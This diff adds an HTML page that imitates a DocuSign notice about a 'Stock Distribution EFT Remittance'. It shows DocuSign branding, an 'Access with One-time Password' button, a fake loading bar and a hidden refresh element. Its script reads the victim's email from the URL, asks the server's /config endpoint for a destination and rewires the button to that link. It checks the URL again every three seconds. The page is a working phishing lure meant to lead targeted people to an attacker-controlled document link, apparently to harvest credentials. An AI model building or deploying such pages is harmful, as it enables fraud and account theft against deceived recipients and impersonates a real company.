@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DocuSign Stock Distribution EFT Remittance</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Helvetica, Arial, "Sans Serif";
+      background-color: #eaeaea;
+      margin: 0;
+      padding: 0;
+      direction: ltr;
+    }
+    .container {
+      max-width: 480px;
+      margin: 32px auto;
+      background: #fff;
+      border-radius: 5px;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+    .header {
+      padding: 16px;
+      text-align: center;
+      background: #fff;
+    }
+    .logo {
+      margin-bottom: 6px;
+      width: 96px;
+    }
+    .banner {
+      background: #1e4ca1;
+      color: #fff;
+      padding: 24px 12px;
+      text-align: center;
+      border-radius: 2px;
+    }
+    .banner img {
+      width: 56px;
+      height: 56px;
+      margin-bottom: 16px;
+    }
+    .banner-title {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      display: block;
+    }
+    .review-btn {
+      display: inline-block;
+      background: #ffc423;
+      color: #333;
+      font-size: 13px;
+      font-weight: bold;
+      border-radius: 2px;
+      padding: 0 16px;
+      line-height: 36px;
+      margin: 20px 0 0 0;
+      text-decoration: none;
+    }
+    .plain-text {
+      font-size: 13px;
+      margin: 15px 0; /* Increased margin for space around "Review Document" */
+      text-align: center;
+      text-decoration: none;
+      color: #333;
+    }
+    .content {
+      padding: 16px;
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+    }
+    .user {
+      font-weight: bold;
+      margin-bottom: 2px;
+      font-size: 13px;
+      text-align: center;
+    }
+    .user-email {
+      color: #1473e6;
+      margin-bottom: 10px;
+      display: block;
+      font-size: 13px;
+      text-align: center;
+    }
+    .instructions {
+      margin-bottom: 10px;
+      line-height: 1.4;
+      font-size: 13px;
+      text-align: center;
+    }
+    .subheader {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .footer-image-wrap {
+      background: #fff;
+      padding: 0;
+      margin: 0;
+      border: none;
+    }
+    .footer-box {
+      background: #e0e0e0;
+      padding: 20px 12px 12px 12px;
+      margin: 0;
+      border: none;
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+    }
+    .footer-logo {
+      margin-bottom: 8px;
+      display: block;
+      width: 80px;
+      height: auto;
+    }
+    .footer-title {
+      font-weight: bold;
+      margin-bottom: 2px;
+      font-size: 14px;
+      text-align: center;
+    }
+    .footer-section-title {
+      font-weight: bold;
+      margin-top: 12px;
+      margin-bottom: 2px;
+      font-size: 13px;
+      display: block;
+      text-align: center;
+    }
+    .footer-note {
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+      margin-bottom: 0;
+      text-align: center;
+    }
+    .date-time {
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .loading-animation {
+      width: 100%;
+      height: 10px;
+      background: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+      position: relative;
+      margin: 10px 0;
+      text-align: center;
+    }
+    .loading-bar {
+      height: 100%;
+      background: #1e4ca1;
+      width: 0;
+      animation: load 2s infinite;
+    }
+    @keyframes load {
+      0% { width: 0; }
+      50% { width: 50%; }
+      100% { width: 100%; }
+    }
+    .auto-redirect {
+      display: none;
+    }
+    .disclaimer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+      text-align: left;
+      line-height: 1.4;
+      border: 1px solid #8B4513;
+      background-color: #D2B48C;
+      padding: 10px;
+    }
+    .disclaimer-title {
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .disclaimer-app {
+      text-align: left;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img class="logo" alt="DocuSign" src="data:image/png;base64,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">
+    </div>
+    <div class="banner">
+      <img src="data:image/png;base64,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">
+      <span class="banner-title">Please Review the Docusign Document: Docusign_Envelope_38230</span>
+      <a href="#" class="review-btn">Access with One-time Password</a>
+    </div>
+    <div class="content">
+      <div class="subheader">Opening Document: Employee-Q1.pdf</div>
+      <div class="date-time">
+        This document is ready for you to review, sign and complete.<br>Click on the button above to review and electronically sign the document.
+      </div>
+      <a href="#" class="plain-text">Review Document</a>
+      <div class="loading-animation">
+        <div class="loading-bar"></div>
+      </div>
+      <div class="disclaimer">
+        Do Not Share This Email<br>
+        This email contains a secure document sent via Docusign. Please do not share this email or attachments with others.<br>
+        <div class="disclaimer-app">DocuSign App</div>
+        If you would rather not receive email from this sender you may contact the sender with your request.
+      </div>
+      <div class="auto-redirect">
+        <meta http-equiv="refresh">
+      </div>
+    </div>
+    <!-- Footer per Image #1 -->
+    <div class="footer-image-wrap">
+      <div class="footer-box">
+        <div class="footer-note">
+          DocuSign, 2025 Inc. All rights reserved.
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+<script>
+(function() {
+  let lastEmail = null;
+
+  function getEmailFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("email");
+  }
+
+  async function refreshConfig(email) {
+    try {
+      const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
+      const cfg = await res.json();
+
+      // update restoreBtn
+      document.querySelector(".review-btn").href = cfg.DOCUMENT_URL;
+
+    } catch (err) {
+      console.error("Config load failed", err);
+    }
+  }
+
+  function checkForEmailChange() {
+    const email = getEmailFromUrl();
+    console.log(`Checked email and found ${email}`)
+    if (email && email.length > 4 && email !== lastEmail) {
+      lastEmail = email;
+      refreshConfig(email);
+    }
+  }
+
+  // Run at page load
+  //checkForEmailChange();
+  refreshConfig('');
+
+  // Watch periodically (since user can manually edit URL bar)
+  setInterval(checkForEmailChange, 3000);
+
+})();
+</script>
+</html>
